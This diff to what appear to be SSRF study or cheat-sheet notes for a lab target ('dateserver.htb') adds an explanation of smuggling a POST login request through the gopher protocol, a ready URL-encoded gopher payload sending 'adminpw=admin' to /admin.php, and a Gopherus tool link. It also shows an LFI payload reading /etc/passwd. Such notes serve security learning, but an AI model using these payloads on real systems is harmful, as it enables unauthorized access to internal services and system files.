@@ -22,4 +22,21 @@ Command to exploit SSRF :
 
 **Local File Inclusion (LFI)** : `file:///etc/passwd`
 
-**gopher Protocol :**  
+**gopher Protocol :**  If we don't have any way to send a POST Request with Login Credentials to the server, we can use this protocol to send the request : 
+```http
+POST /admin.php HTTP/1.1
+Host: dateserver.htb
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+adminpw=admin
+```
+
+We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded. Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:
+
+```
+gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+```
+
+We can use this tool to generate the Gopher URLs : `https://github.com/tarunkant/Gopherus`
+
